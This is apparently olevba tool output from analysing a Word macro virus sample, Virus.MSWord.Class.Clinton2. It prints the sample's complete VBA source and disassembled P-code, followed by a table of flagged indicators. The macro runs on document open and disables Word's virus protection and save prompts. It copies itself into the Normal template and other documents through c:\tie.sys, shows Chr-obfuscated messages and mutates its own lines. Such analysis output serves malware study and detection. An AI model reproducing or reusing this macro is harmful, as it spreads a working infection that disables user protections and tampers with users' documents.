olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.Clinton2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.Clinton2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 73

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

ties = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

tier = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If tier > 74 And ties > 0 Then GoTo 73

If tier < 74 Then

 Set tvir = NormalTemplate.VBProject.VBComponents.Item(1)

 ActiveDocument.VBProject.VBComponents.Item(1).Name = tvir.Name

 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\tie.sys"

End If

If ties = 0 Then Set tvir = ActiveDocument.VBProject.VBComponents.Item(1)

 Infection = Int(Rnd * 100)

 If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

 If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

 tvir.codemodule.AddFromFile ("c:\tie.sys")

 With tvir.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

 End With

 If tier < 74 Then

    With tvir.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 79, "Sub ToolsMacro()"
       
    rd1 = Int(Rnd * 25)

 If rd1 = 24 Then .replaceline 67, ".replaceline x, ""'"" & Application.ActivePrinter & Application.ActiveWindow"
    
End With

 End If

 With tvir.codemodule

    For x = 2 To 76 Step 2

    .replaceline x, "'" & Application.UserName & Application.ActiveWindow

    Next x

 End With

73:

 If tier > 74 And ties = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

 End Sub

Sub ViewVBCode()

End Sub





-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.Clinton2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4221 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	OnError 73 
' Line #3:
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ties 
' Line #11:
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St tier 
' Line #13:
' Line #14:
' 	Ld tier 
' 	LitDI2 0x004A 
' 	Gt 
' 	Ld ties 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 73 
' 	EndIf 
' Line #15:
' Line #16:
' 	Ld tier 
' 	LitDI2 0x004A 
' 	Lt 
' 	IfBlock 
' Line #17:
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set tvir 
' Line #19:
' Line #20:
' 	Ld tvir 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' Line #22:
' 	LitStr 0x000A "c:\tie.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Ld ties 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set tvir 
' 	EndIf 
' Line #27:
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St Infection 
' Line #29:
' Line #30:
' 	Ld Infection 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #31:
' Line #32:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #33:
' Line #34:
' 	LitStr 0x000A "c:\tie.sys"
' 	Paren 
' 	Ld tvir 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #35:
' Line #36:
' 	StartWithExpr 
' 	Ld tvir 
' 	MemLd codemodule 
' 	With 
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #39:
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #41:
' Line #42:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' Line #44:
' 	EndWith 
' Line #45:
' Line #46:
' 	Ld tier 
' 	LitDI2 0x004A 
' 	Lt 
' 	IfBlock 
' Line #47:
' Line #48:
' 	StartWithExpr 
' 	Ld tvir 
' 	MemLd codemodule 
' 	With 
' Line #49:
' Line #50:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #51:
' Line #52:
' 	LitDI2 0x004F 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' Line #54:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	St rd1 
' Line #55:
' Line #56:
' 	Ld rd1 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0043 
' 	LitStr 0x004A ".replaceline x, "'" & Application.ActivePrinter & Application.ActiveWindow"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #57:
' Line #58:
' 	EndWith 
' Line #59:
' Line #60:
' 	EndIfBlock 
' Line #61:
' Line #62:
' 	StartWithExpr 
' 	Ld tvir 
' 	MemLd codemodule 
' 	With 
' Line #63:
' Line #64:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x004C 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #65:
' Line #66:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' Line #68:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' Line #70:
' 	EndWith 
' Line #71:
' Line #72:
' 	LineNum 73 
' 	BoS 0x0000 
' Line #73:
' Line #74:
' 	Ld tier 
' 	LitDI2 0x004A 
' 	Gt 
' 	Ld ties 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #75:
' Line #76:
' 	EndSub 
' Line #77:
' Line #78:
' 	FuncDefn (Sub ViewVBCode())
' Line #79:
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

